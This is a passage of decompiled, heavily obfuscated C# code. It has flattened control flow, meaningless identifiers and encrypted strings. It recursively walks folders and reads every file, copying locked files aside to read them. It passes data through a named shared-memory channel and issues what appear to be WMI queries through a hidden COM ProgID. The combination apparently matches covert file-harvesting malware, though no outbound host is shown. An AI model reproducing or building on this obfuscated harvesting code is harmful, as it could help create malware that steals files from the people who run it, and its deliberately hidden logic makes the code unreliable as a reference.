				row9445 row9447 = default(row9445);
				while (true) {
					int num = -1425426610;
					while (true) {
						uint num2 = (uint)(num - 1684186239);
						switch (num2 % 5) {
						case 3u:
							break;
						default:
							num = -1425426610;
							continue;
						case 2u:
							goto IL_0035;
						case 4u:
							goto end_IL_0003;
						case 0u:
							row9446 = new row9445 (data503);
							num = 1920087665;
							continue;
						case 1u: {
							using (IEnumerator<FileInfo> enumerator = status423.id560 (data503).GetEnumerator ()) {
								while (true) {
									IL_00dd:
									int num3 = (enumerator.MoveNext () ? (-1464840282) : (-1351963919));
									while (true) {
										num2 = (uint)(-num3 + -1035573532);
										switch (num2 % 6) {
										case 3u:
											num3 = -1464840282;
											continue;
										default:
											num3 = -1464840282;
											continue;
										case 2u:
											input6340 = context9200 (enumerator.Current.FullName, tree503);
											num3 = -1898193669;
											continue;
										case 0u:
											row9446.level867 (input6340);
											num3 = (int)(0 - num2) + -1129872020;
											continue;
										case 4u:
											break;
										case 5u:
											num3 = ((input6340 != null) ? ((int)(num2 + 1597166719)) : ((int)num2 ^ -1080756967));
											continue;
										case 1u:
											goto end_IL_007f;
										}
										goto IL_00dd;
										continue;
										end_IL_007f:
										break;
									}
									break;
								}
							}
							using IEnumerator<DirectoryInfo> enumerator2 = status423.args3354 (data503).GetEnumerator ();
							while (true) {
								int num4 = ((!enumerator2.MoveNext ()) ? 684305776 : (--325247916));
								while (true) {
									switch ((num2 = (uint)(num4 ^ 0x627A2016)) % 6) {
									case 0u:
										num4 = 325247916;
										continue;
									default:
										num4 = 325247916;
										continue;
									case 1u:
										row9446.dir16 (row9447);
										num4 = (int)(~num2) + -1487569243;
										continue;
									case 3u:
										num4 = ((row9447 == null) ? ((int)num2 - -799174660) : ((int)(~num2 + 356331191)));
										continue;
									case 2u:
										row9447 = path295 (enumerator2.Current, tree503);
										num4 = 1775018601;
										continue;
									case 5u:
										break;
									case 4u:
										return row9446;
									}
									break;
								}
							}
						}
						}
						break;
						IL_0035:
						num = (data503.Exists ? ((int)num2 - -1547537362) : ((int)(num2 + 1039142236)));
					}
					continue;
					end_IL_0003:
					break;
				}
			}
			return null;
		}

		public static input6339 context9200 (string stream1156, int page1438 = int.MaxValue)
		{
			if (string.IsNullOrEmpty (stream1156)) {
				goto IL_000b;
			}
			goto IL_00de;
			IL_000b:
			int num = ~1093273464;
			goto IL_0011;
			IL_0011:
			byte[] array8361 = default(byte[]);
			FileInfo fileInfo = default(FileInfo);
			while (true) {
				uint num2 = (uint)(~num ^ 0x7D830EEF);
				switch (num2 % 11) {
				case 7u:
					break;
				default:
					num = -1093273465;
					continue;
				case 8u:
					return null;
				case 5u:
					return null;
				case 10u:
					goto IL_006c;
				case 3u:
					return null;
				case 0u:
					array8361 = child749 (fileInfo, page1438);
					num = ~1404357931;
					continue;
				case 4u:
					goto IL_00a0;
				case 1u:
					goto IL_00c1;
				case 9u:
					goto IL_00de;
				case 2u:
					goto IL_00ef;
				case 6u:
					return new input6339 (fileInfo, array8361);
				}
				break;
				IL_00ef:
				num = ((fileInfo != null) ? ((int)(num2 + 1833485867)) : ((int)(~num2) + -1515796388));
				continue;
				IL_00a0:
				num = (int)(fileInfo.Exists ? (~num2 ^ 0x20515B96) : (~num2 ^ 0x7F630F9F));
				continue;
				IL_006c:
				num = ((array8361 == null) ? ((int)num2 + -2111785487) : ((int)num2 + -1217332513));
				continue;
				IL_00c1:
				num = (int)((array8361.Length != 0) ? (~num2 ^ 0x498956AD) : (0 - num2 + 405588328));
			}
			goto IL_000b;
			IL_00de:
			fileInfo = new FileInfo (stream1156);
			num = -1736183600;
			goto IL_0011;
		}

		public static byte[] child749 (FileInfo error34, int session89 = int.MaxValue)
		{
			if (error34 != null) {
				string fullName = default(string);
				byte[] result = default(byte[]);
				while (true) {
					int num = -1910408217;
					while (true) {
						uint num2 = (uint)(num + -688642298);
						switch (num2 % 11) {
						case 2u:
							break;
						default:
							num = -1910408217;
							continue;
						case 9u:
							goto IL_0051;
						case 7u:
							session403 [fullName] = 0;
							num = (int)(0 - num2) ^ -1868335133;
							continue;
						case 3u:
							goto IL_0087;
						case 5u: {
							Dictionary<string, int> dictionary = session403;
							string key = fullName;
							int num4 = dictionary [key];
							dictionary [key] = num4 + flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("d9b00130e6d7bd16c95");
							num = --961908335;
							continue;
						}
						case 4u:
							goto IL_00d6;
						case 8u:
							goto end_IL_0006;
						case 0u:
							goto IL_010f;
						case 1u:
							return new byte[0];
						case 10u:
							fullName = error34.FullName;
							num = 1674124085;
							continue;
						case 6u:
							try {
								byte[] array8361 = File.ReadAllBytes (fullName);
								session403.Remove (fullName);
								result = array8361;
							} catch (FileNotFoundException) {
								result = new byte[0];
							} catch (OutOfMemoryException) {
								GC.Collect ();
								result = new byte[0];
							} catch {
								try {
									error34.CopyTo (error989.FullName, flag6144.09343d4890d2414f8aa92dc5c3eb3877 ("e9f2adcdd8022"));
									byte[] array8362 = child749 (error989, session89);
									while (true) {
										IL_01c8:
										int num3 = ~-653791734;
										while (true) {
											num2 = (uint)(num3 + -420900044);
											switch (num2 % 7) {
											case 4u:
												break;
											default:
												num3 = 653791733;
												continue;
											case 0u:
												goto end_IL_01ce;
											case 3u:
												num3 = ((array8362.Length != error34.Length) ? ((int)(~num2 ^ 0x4757204D)) : ((int)(~num2) ^ -105416065));
												continue;
											case 1u:
												session403.Remove (fullName);
												File.WriteAllBytes (error989.FullName, new byte[0]);
												num3 = (int)(num2 ^ 0x48369E21);
												continue;
											case 6u:
												result = array8362;
												num3 = (int)(num2 ^ 0x7AA11EC);
												continue;
											case 2u:
												num3 = ((array8362 == null) ? ((int)((0 - num2) ^ 0x740BBD59)) : ((int)(~num2) ^ -1513226274));
												continue;
											case 5u:
												goto end_IL_01a0;
											}
											goto IL_01c8;
											continue;
											end_IL_01ce:
											break;
										}
										break;
									}
									goto end_IL_019f;
									end_IL_01a0:;
								} catch {
								}
								result = new byte[0];
								end_IL_019f:;
							}
							return result;
						}
						break;
						IL_010f:
						num = ((session403 [fullName] < flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("f9e0914fd6d5bf1c08d")) ? ((int)(0 - num2) + -1974968045) : ((int)(~num2 ^ 0x6C2EE61F)));
						continue;
						IL_0087:
						num = (int)((error34.Length <= session89) ? (num2 + 510526081) : (num2 ^ 0x2F4DFD76));
						continue;
						IL_0051:
						num = ((!error34.Exists) ? ((int)(num2 - 68111921)) : ((int)(0 - num2) + -596826703));
						continue;
						IL_00d6:
						num = (session403.ContainsKey (fullName) ? ((int)num2 - -958013764) : ((int)(0 - num2) + -2141911399));
					}
					continue;
					end_IL_0006:
					break;
				}
			}
			return new byte[0];
		}
	}
}
namespace config052
{
	public class error34
	{
		public static bool index44 (string file672)
		{
			if (!string.IsNullOrEmpty (file672)) {
				while (true) {
					int num = -621260113;
					while (true) {
						uint num2 = (uint)(num ^ -242510430);
						switch (num2 % 4) {
						case 2u:
							break;
						default:
							num = -621260113;
							continue;
						case 1u:
							goto IL_0034;
						case 0u:
							goto end_IL_0008;
						case 3u:
							return flag6144.09343d4890d2414f8aa92dc5c3eb3877 ("0d9c8fc1d5378");
						}
						break;
						IL_0034:
						num = ((file672.Length == flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("bfee14b26e9698a5ecd")) ? ((int)num2 + -2063319556) : ((int)((0 - num2) ^ 0x3D4ABDA1)));
					}
					continue;
					end_IL_0008:
					break;
				}
			}
			return false;
		}

		public static bool column31 (DateTime output939, DateTime right171)
		{
			DateTime dateTime = DateTime.UtcNow.ToLocalTime ();
			DateTime dateTime3 = default(DateTime);
			DateTime dateTime2 = default(DateTime);
			while (true) {
				int num = 2047821480;
				while (true) {
					uint num2;
					switch ((num2 = (uint)((num ^ -53521641) - 1732821516)) % 6) {
					case 3u:
						break;
					default:
						num = 2047821480;
						continue;
					case 5u:
						_ = dateTime3 - dateTime2;
						num = ((!(dateTime > dateTime3.AddDays (flag6144.db323f5d3b94412383acfe35230a0b47 ("f9a4e4b9380da4ff3583e703a1c")))) ? ((int)(~num2) ^ -1859029357) : ((int)(~num2 + 1111109065)));
						continue;
					case 2u:
						dateTime3 = right171.ToLocalTime ();
						_ = dateTime2 - dateTime;
						num = (int)num2 - -386931432;
						continue;
					case 0u:
						return false;
					case 1u:
						dateTime2 = output939.ToLocalTime ();
						num = (int)(~num2 + 1048906277);
						continue;
					case 4u:
						return flag6144.09343d4890d2414f8aa92dc5c3eb3877 ("1d959208c8f0a");
					}
					break;
				}
			}
		}
	}
}
namespace min3119
{
	public class list47 : IDisposable
	{
		private IntPtr total63;

		private IntPtr color751;

		[CompilerGenerated]
		private readonly string price27;

		public string status320 {
			[CompilerGenerated]
			get {
				return price27;
			}
		}

		public list47 ()
		{
			while (true) {
				int num = ~45846188;
				while (true) {
					uint num2 = (uint)(-num ^ 0x382589C4);
					switch (num2 % 5) {
					case 4u:
						break;
					default:
						num = -45846189;
						continue;
					case 3u:
						price27 = string.Format (flag6144.0e291526dfde44109a60e580c474e7dd ("c92969ca3cde6c5d2cfd99f9fd503014f"), Guid.NewGuid ());
						num = (int)(0 - num2) + -649749871;
						continue;
					case 1u:
						total63 = stack564.session3768 (new IntPtr (flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("f99abfeaa9e59f35812")), IntPtr.Zero, (uint)flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("ac9d47e4c99df3cf5ce"), 0u, (uint)flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("e9351465d0f0b913ea8"), status320);
						num = (int)((!(total63 == IntPtr.Zero)) ? (num2 + 2144151848) : (0 - num2 + 56141122));
						continue;
					case 2u:
						throw new InvalidOperationException ();
					case 0u:
						return;
					}
					break;
				}
			}
		}

		public void key075 ()
		{
			color751 = stack564.total0017 (total63, (uint)flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("af710b55f39e6e6ee36"), 0u, 0u, IntPtr.Zero);
			while (true) {
				int num = 702494584;
				while (true) {
					uint num2;
					switch ((num2 = (uint)(num ^ 0xA0767F2)) % 4) {
					case 3u:
						break;
					default:
						num = 702494584;
						continue;
					case 2u:
						num = ((!(color751 == IntPtr.Zero)) ? ((int)(~num2) ^ -1680440581) : ((int)num2 - -1258360465));
						continue;
					case 1u:
						throw new InvalidOperationException ();
					case 0u:
						Marshal.WriteInt32 (color751, 0, 0);
						return;
					}
					break;
				}
			}
		}

		public bool mode675 (byte[] end1450, int height6030 = 10000)
		{
			if (end1450 != null) {
				int num4 = default(int);
				int num3 = default(int);
				while (true) {
					int num = 1992535669;
					while (true) {
						uint num2;
						switch ((num2 = (uint)(num + -1674498833)) % 21) {
						case 15u:
							break;
						default:
							num = 1992535669;
							continue;
						case 1u:
							num4 = Environment.TickCount + height6030;
							num = -1511484637;
							continue;
						case 20u:
							Marshal.Copy (end1450, 0, new IntPtr (color751.ToInt64 () + flag6144.a5572d1b20c542f7b801adb820e4ecef ("ac739848bef264978f4d7dad828")), end1450.Length);
							num = -1682930302;
							continue;
						case 9u:
							goto IL_00b6;
						case 7u:
							Marshal.WriteInt32 (color751, flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("4a1aabd1d778f4d629f"), end1450.Length);
							Thread.MemoryBarrier ();
							Marshal.WriteInt32 (color751, 0, flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("c959e836d7d4be13dc7"));
							num = (int)num2 ^ -1496856654;
							continue;
						case 17u:
							goto IL_011b;
						case 8u:
							num3 = Marshal.ReadInt32 (color751, 0);
							num = --1750402919;
							continue;
						case 5u:
							goto IL_0158;
						case 3u:
							goto IL_0174;
						case 4u:
							Thread.Sleep (flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("1d9c7056ca4bc25a127"));
							num = -831642158;
							continue;
						case 11u:
							Marshal.WriteInt32 (color751, 0, 0);
							num = (int)num2 - -810231297;
							continue;
						case 13u:
							num = (int)num2 ^ -1938299456;
							continue;
						case 10u:
							goto IL_01cc;
						case 14u:
							goto end_IL_0006;
						case 12u:
							num = (int)((0 - num2) ^ 0x6F7EF91C);
							continue;
						case 0u:
							goto IL_0209;
						case 6u:
							Thread.MemoryBarrier ();
							num = (int)(num2 - 1834499282);
							continue;
						case 19u:
							return false;
						case 18u:
							goto IL_0245;
						case 2u:
							return false;
						case 16u:
							return flag6144.09343d4890d2414f8aa92dc5c3eb3877 ("1d98abd5f124b");
						}
						break;
						IL_0245:
						num = ((num3 != flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("e92766b492c23899b44")) ? (-1915414249) : (-942068925));
						continue;
						IL_00b6:
						num = ((end1450.Length <= flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("beaa80742c93c1dff2b")) ? ((int)num2 + -1607117209) : ((int)(num2 + 2126092729)));
						continue;
						IL_0158:
						num = ((end1450.Length != 0) ? ((int)(~num2) ^ -1974864006) : ((int)num2 ^ -1864810003));
						continue;
						IL_0209:
						num = ((Environment.TickCount < num4) ? 2071167778 : (~1610109501));
						continue;
						IL_0174:
						num = ((num3 == 0) ? ((int)(num2 + 1822984527)) : ((int)num2 - -937000351));
						continue;
						IL_011b:
						num = ((num3 == flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("f9cd1ea1d8c3ce601e7")) ? ((int)(~num2) ^ -1747780315) : ((int)(num2 - 1894707790)));
						continue;
						IL_01cc:
						num = ((Marshal.ReadInt32 (color751, 0) != 0) ? (-1853335752) : (--1680799567));
					}
					continue;
					end_IL_0006:
					break;
				}
			}
			return false;
		}

		public bool speed285 (byte[] source810, int parent73 = 10000)
		{
			byte[] array8361 = new byte[flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("e98f3e315df0aa059b8") + source810.Length];
			while (true) {
				int num = 1058919906;
				while (true) {
					uint num2 = (uint)(~num + -1230366099);
					switch (num2 % 4) {
					case 0u:
						break;
					default:
						num = 1058919906;
						continue;
					case 2u:
						array8361 [0] = (byte)flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("0f904f6d95565b8831b");
						num = (int)num2 ^ -703289605;
						continue;
					case 3u:
						Buffer.BlockCopy (source810, 0, array8361, flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("9e13b962689c1704447"), source810.Length);
						num = (int)num2 ^ -1239773088;
						continue;
					case 1u:
						return mode675 (array8361, parent73);
					}
					break;
				}
			}
		}

		public byte[] current29 (string buffer85, int map2737 = int.MaxValue, int name6604 = 8384512, int limit15 = 10000, int queue41 = 60000)
		{
			if (string.IsNullOrEmpty (buffer85)) {
				goto IL_000b;
			}
			goto IL_010d;
			IL_000b:
			int num = -1788889968;
			goto IL_0010;
			IL_0010:
			long num4 = default(long);
			byte[] result = default(byte[]);
			byte[] array8363 = default(byte[]);
			int num7 = default(int);
			byte[] array8364 = default(byte[]);
			while (true) {
				uint num2;
				switch ((num2 = (uint)(num - 1115310565)) % 11) {
				case 4u:
					break;
				default:
					num = -1788889968;
					continue;
				case 3u:
					goto IL_0055;
				case 9u:
					goto IL_007a;
				case 1u:
					return null;
				case 5u:
					goto IL_00aa;
				case 6u:
					return null;
				case 7u:
					return null;
				case 2u:
					goto IL_00e5;
				case 0u:
					goto IL_010d;
				case 8u:
					return null;
				case 10u: {
					int num3 = (int)num4;
					try {
						byte[] array8361 = new byte[num3];
						long num5 = 0L;
						while (true) {
							IL_0147:
							int num6 = -674344308;
							while (true) {
								switch ((num2 = (uint)(num6 - -1699568953)) % 18) {
								case 12u:
									break;
								default:
									num6 = -674344308;
									continue;
								case 11u:
									result = array8361;
									num6 = (int)(0 - num2) + -309990625;
									continue;
								case 8u:
									result = null;
									goto end_IL_014c;
								case 1u:
									array8363 = key6912 (limit15);
									num6 = ((array8363 == null) ? 438102358 : (-45659341));
									continue;
								case 17u:
									num6 = ((num5 != 0L) ? (-1509260295) : (-702146644));
									continue;
								case 9u:
									result = null;
									goto end_IL_014c;
								case 0u:
									Buffer.BlockCopy (array8363, 0, array8361, (int)num5, array8363.Length);
									num6 = -160011623;
									continue;
								case 10u:
									num6 = ((num5 < num3) ? (-992783596) : (~300523756));
									continue;
								case 3u:
									num7 = (int)Math.Min (name6604, num3 - num5);
									num6 = ~-392573368;
									continue;
								case 5u:
									result = null;
									goto end_IL_014c;
								case 2u:
									num6 = ((num5 != num3) ? (-1646411120) : (~1066486675));
									continue;
								case 14u:
									num5 += array8363.Length;
									num6 = ((array8363.Length < num7) ? ((int)num2 ^ -1244292927) : ((int)num2 ^ -1313011183));
									continue;
								case 15u:
									num6 = (int)(count86 (num5, num7, limit15) ? (~num2 ^ 0x1F01A20C) : (~num2 + 39333275));
									continue;
								case 7u:
									goto end_IL_014c;
								case 13u:
									num6 = (int)(0 - num2 + 664436104);
									continue;
								case 16u:
									num6 = ((num7 <= 0) ? ((int)(num2 + 1902301219)) : ((int)num2 - -1980537818));
									continue;
								case 6u:
									num6 = ((array8363.Length != 0) ? ((int)num2 - -1148277969) : ((int)(~num2) ^ -2022195515));
									continue;
								case 4u: {
									byte[] array8362 = new byte[num5];
									Buffer.BlockCopy (array8361, 0, array8362, 0, (int)num5);
									result = array8362;
									goto end_IL_014c;
								}
								}
								goto IL_0147;
								continue;
								end_IL_014c:
								break;
							}
							break;
						}
					} finally {
						if (key81 (limit15)) {
							key6912 (limit15);
						}
					}
					return result;
				}
				}
				break;
				IL_00e5:
				num = ((num4 <= flag6144.a5572d1b20c542f7b801adb820e4ecef ("c97ffeba21ff31e8eb513dc445d")) ? ((int)(0 - num2) ^ -1715386794) : ((int)(num2 + 970221593)));
				continue;
				IL_007a:
				num4 = (long)BitConverter.ToUInt64 (array8364, 0);
				num = ((num4 <= 0) ? 1267038808 : (~-1412127781));
				continue;
				IL_0055:
				num = ((array8364.Length == flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("707d274eaca38f0919f")) ? ((int)num2 ^ -190223861) : ((int)(num2 + 310422629)));
				continue;
				IL_00aa:
				array8364 = key6912 (queue41);
				num = ((array8364 == null) ? (~-2143798232) : (-1346281129));
			}
			goto IL_000b;
			IL_010d:
			num = (temp37 (buffer85, map2737, queue41) ? 1706380753 : (-1166151924));
			goto IL_0010;
		}

		public bool temp37 (string current569, int size13, int data9441 = 10000)
		{
			byte[] bytes = Encoding.Unicode.GetBytes (current569 + flag6144.0e291526dfde44109a60e580c474e7dd ("d90c638e964c2"));
			byte[] array8361 = new byte[flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("c9f889bd01ef05a0a0d") + bytes.Length];
			array8361 [0] = (byte)flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("bfde04f3d2958bb669a");
			Buffer.BlockCopy (BitConverter.GetBytes ((uint)size13), 0, array8361, flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("48a91dafbbc97a62d9e"), flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("6276a56e2684852a59d"));
			Buffer.BlockCopy (bytes, 0, array8361, flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("62b3fc66f37562d2c9d"), bytes.Length);
			return mode675 (array8361, data9441);
		}

		public bool count86 (long number79, int input228, int options6668 = 10000)
		{
			byte[] array8361 = new byte[flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("6d1dafff449dd73209e")];
			while (true) {
				int num = 546961264;
				while (true) {
					uint num2 = (uint)(num ^ 0x3FA5E5D1);
					switch (num2 % 4) {
					case 3u:
						break;
					default:
						num = 546961264;
						continue;
					case 1u:
						array8361 [0] = (byte)flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("58e98f21e367c2c069e");
						num = (int)(0 - num2 + 1270238610);
						continue;
					case 0u:
						Buffer.BlockCopy (BitConverter.GetBytes ((ulong)number79), 0, array8361, flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("0c9c7126cb389abde59"), flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("f909aadea0e26bc1aa6"));
						Buffer.BlockCopy (BitConverter.GetBytes ((uint)input228), 0, array8361, flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("0f95c53bff077122ef0"), flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("f92ccf3864f0bd1e9ba"));
						num = (int)num2 - -466369079;
						continue;
					case 2u:
						return mode675 (array8361, options6668);
					}
					break;
				}
			}
		}

		public bool key81 (int cache115 = 5000)
		{
			return mode675 (flag6144.afc56a45054d43f79162e3afe08ecda2 ("3e9d3fa035506"), cache115);
		}

		public byte[] key6912 (int next0562)
		{
			int num = Environment.TickCount + next0562;
			int num5 = default(int);
			int num4 = default(int);
			byte[] array8362 = default(byte[]);
			int num6 = default(int);
			byte[] array8361 = default(byte[]);
			while (true) {
				int num2 = ~-241206900;
				while (true) {
					uint num3 = (uint)(num2 - -36724208);
					switch (num3 % 18) {
					case 8u:
						break;
					default:
						num2 = 241206899;
						continue;
					case 3u:
						num2 = ((num5 != flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("7b013d3da936fa9b29d")) ? (--1383866081) : 369151473);
						continue;
					case 11u:
						num4 = Marshal.ReadInt32 (color751, flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("6dee0f5fbdabfe0169f"));
						num2 = (int)(num3 - 865962856);
						continue;
					case 13u:
						Thread.Sleep (flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("d913a22ee6f278d30cf"));
						num2 = --627313112;
						continue;
					case 5u:
						Marshal.WriteInt32 (color751, 0, 0);
						return null;
					case 4u:
						num2 = ((Environment.TickCount < num) ? (--1311596048) : 954909068);
						continue;
					case 7u:
						array8362 = new byte[num6];
						num2 = (int)(num3 ^ 0x6C4D55B9);
						continue;
					case 0u:
						num2 = ((num5 != flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("c97f3e1578ec8625cf9")) ? ((int)(num3 ^ 0x34D961C1)) : ((int)(~num3) ^ -471244202));
						continue;
					case 10u:
						num2 = ((Marshal.ReadInt32 (color751, 0) != flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("e9a5e453f8f812b44c8")) ? ((int)(num3 ^ 0x56B2DBC4)) : ((int)num3 - -670123533));
						continue;
					case 14u:
						return array8361;
					case 12u:
						Marshal.Copy (new IntPtr (color751.ToInt64 () + flag6144.a5572d1b20c542f7b801adb820e4ecef ("aca5ce15031d489b33166d88a7b")), array8362, 0, num6);
						return array8362;
					case 1u:
						num2 = (int)(num3 + 349382005);
						continue;
					case 15u:
						num2 = ((num4 > 0) ? ((int)(~num3 + 1491780208)) : ((int)num3 - -682265820));
						continue;
					case 9u:
						num6 = Marshal.ReadInt32 (color751, flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("bf48d2fbb892a89eef4"));
						Marshal.WriteInt32 (color751, 0, 0);
						num2 = ((num6 <= 0) ? ((int)num3 - -141361471) : ((int)(num3 ^ 0x30ACAA6A)));
						continue;
					case 17u:
						return null;
					case 16u:
						num5 = Marshal.ReadInt32 (color751, 0);
						Thread.MemoryBarrier ();
						num2 = 2013732652;
						continue;
					case 2u:
						array8361 = new byte[num4];
						Marshal.Copy (new IntPtr (color751.ToInt64 () + flag6144.a5572d1b20c542f7b801adb820e4ecef ("d9c745b4203ffef761d48cbc724")), array8361, 0, num4);
						Marshal.WriteInt32 (color751, 0, 0);
						num2 = 618807780;
						continue;
					case 6u:
						return null;
					}
					break;
				}
			}
		}

		public void state0138 ()
		{
			if (color751 != IntPtr.Zero) {
				Marshal.WriteInt32 (color751, 0, flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("6ca7935b1cfa7f57a9c"));
			}
		}

		public void source034 ()
		{
			state0138 ();
			while (true) {
				int num = --1638681446;
				while (true) {
					uint num2;
					switch ((num2 = (uint)((num ^ 0x2CBFE925) - 857162903)) % 7) {
					case 0u:
						break;
					default:
						num = 1638681446;
						continue;
					case 1u:
						stack564.limit89 (total63);
						total63 = IntPtr.Zero;
						num = (int)(~num2) + -1622039936;
						continue;
					case 6u:
						stack564.score9135 (color751);
						num = (int)num2 - -805132798;
						continue;
					case 2u:
						num = (int)((!(color751 != IntPtr.Zero)) ? (num2 + 1589294495) : (num2 + 1173947140));
						continue;
					case 4u:
						num = ((!(total63 != IntPtr.Zero)) ? (--1490569013) : 1429173956);
						continue;
					case 5u:
						color751 = IntPtr.Zero;
						num = (int)(~num2) ^ -1372528650;
						continue;
					case 3u:
						return;
					}
					break;
				}
			}
		}

		public void Dispose ()
		{
			source034 ();
		}

		void IDisposable.Dispose ()
		{
			//ILSpy generated this explicit interface implementation from .override directive in Dispose
			this.Dispose ();
		}
	}
}
namespace mode266
{
	public sealed class node471 : IDisposable
	{
		[CompilerGenerated]
		private readonly list47 status66;

		private array8360.message891 next61;

		private bool target2837;

		public list47 format19 {
			[CompilerGenerated]
			get {
				return status66;
			}
		}

		public node471 (list47 price92, array8360.message891 input3226)
		{
			while (true) {
				int num = -250483954;
				while (true) {
					uint num2 = (uint)(num ^ -1248306429);
					switch (num2 % 4) {
					case 3u:
						break;
					default:
						num = -250483954;
						continue;
					case 1u:
						status66 = price92;
						num = (int)(0 - num2 + 915945560);
						continue;
					case 0u:
						next61 = input3226;
						num = (int)num2 ^ -1052699083;
						continue;
					case 2u:
						return;
					}
					break;
				}
			}
		}

		public void Dispose ()
		{
			if (target2837) {
				goto IL_0008;
			}
			goto IL_0060;
			IL_0008:
			int num = ~1917752427;
			goto IL_000e;
			IL_000e:
			while (true) {
				uint num2;
				switch ((num2 = (uint)(~num ^ 0x6A80ED00)) % 6) {
				case 2u:
					break;
				default:
					num = -1917752428;
					continue;
				case 5u:
					return;
				case 0u: {
					list47 obj = format19;
					if (obj == null) {
						goto case 1u;
					}
					obj.source034 ();
					num = -7397030;
					continue;
				}
				case 3u:
					goto IL_0060;
				case 1u:
					next61.tree52 ();
					num = -525128157;
					continue;
				case 4u:
					return;
				}
				break;
			}
			goto IL_0008;
			IL_0060:
			target2837 = flag6144.09343d4890d2414f8aa92dc5c3eb3877 ("9f904a09dd824");
			num = -1191859639;
			goto IL_000e;
		}

		void IDisposable.Dispose ()
		{
			//ILSpy generated this explicit interface implementation from .override directive in Dispose
			this.Dispose ();
		}
	}
}
namespace message9606
{
	public class sum4738
	{
		private object right72;

		private Dictionary<string, object> message490 = new Dictionary<string, object> ();

		public sum4738 (string stream69)
		{
			try {
				object obj = Activator.CreateInstance (Type.GetTypeFromProgID (flag6144.0e291526dfde44109a60e580c474e7dd ("6f76239052f47fb054be965734d90da5f3686cf8a8659bd40640beedcd0849f")));
				Type type = obj.GetType ();
				string name = flag6144.0e291526dfde44109a60e580c474e7dd ("7c81843b01899a92e2df926af0da324969d9e");
				int invokeAttr = flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("bd842e5db9932235cfc");
				object[] array8361 = new object[flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("8d8923a6e696223edf2")];
				array8361 [0] = flag6144.0e291526dfde44109a60e580c474e7dd ("61c3d46c7c49e");
				array8361 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("c9fa4b7098db11bd2a8")] = stream69;
				right72 = type.InvokeMember (name, (BindingFlags)invokeAttr, null, obj, array8361);
			} catch {
				right72 = null;
			}
		}

		public flag170 path02<flag170> (string product638, string count6824)
		{
			if (right72 == null) {
				goto IL_0008;
			}
			goto IL_0065;
			IL_0008:
			int num = 1347264980;
			goto IL_000d;
			IL_000d:
			object value = default(object);
			string key = default(string);
			while (true) {
				uint num2 = (uint)(num - -303522134);
				switch (num2 % 6) {
				case 3u:
					break;
				default:
					num = 1347264980;
					continue;
				case 5u:
					goto IL_003e;
				case 2u:
					goto IL_0065;
				case 1u:
					return (flag170)value;
				case 4u:
					return default(flag170);
				case 0u:
					goto IL_00ab;
				}
				break;
				IL_003e:
				num = (int)((!message490.TryGetValue (key, out value)) ? (~num2 + 1031154034) : (num2 + 1295727762));
			}
			goto IL_0008;
			IL_00ab:
			object obj;
			try {
				Type type = right72.GetType ();
				string name = flag6144.0e291526dfde44109a60e580c474e7dd ("bd8db9dfe39bcaa985be55de5f4eb");
				int invokeAttr = flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("be64cee4c09aabb6b98");
				object target2354 = right72;
				object[] array8361 = new object[flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("c9ba0b2bfce7dd7544c")];
				array8361 [0] = flag6144.0e291526dfde44109a60e580c474e7dd ("0f9de15a1a95b90c6f886803c") + count6824 + flag6144.0e291526dfde44109a60e580c474e7dd ("77f606b75985580513be59e") + product638;
				obj = type.InvokeMember (name, (BindingFlags)invokeAttr, null, target2354, array8361);
			} catch {
				return default(flag170);
			}
			if (obj == null) {
				goto IL_011e;
			}
			goto IL_01a9;
			IL_016e:
			flag170 val = right48<flag170> (obj, count6824);
			goto IL_0180;
			IL_011e:
			int num3 = 243764218;
			goto IL_0123;
			IL_0123:
			flag170 val2 = default(flag170);
			flag170 result = default(flag170);
			while (true) {
				uint num2 = (uint)(num3 ^ 0x22F31AD6);
				switch (num2 % 7) {
				case 6u:
					break;
				default:
					num3 = 243764218;
					continue;
				case 4u:
					return default(flag170);
				case 2u:
					goto IL_016e;
				case 3u:
					message490 [key] = val2;
					num3 = (int)(0 - num2) ^ -962347707;
					continue;
				case 1u:
					goto IL_01a9;
				case 0u:
					return val2;
				case 5u:
					return result;
				}
				break;
			}
			goto IL_011e;
			IL_0065:
			key = product638 + flag6144.0e291526dfde44109a60e580c474e7dd ("d926a97ecae0d") + count6824;
			num = 163302423;
			goto IL_000d;
			IL_01a9:
			if (typeof(flag170).IsArray) {
				val = text01<flag170> (obj, count6824);
				goto IL_0180;
			}
			num3 = --1033201357;
			goto IL_0123;
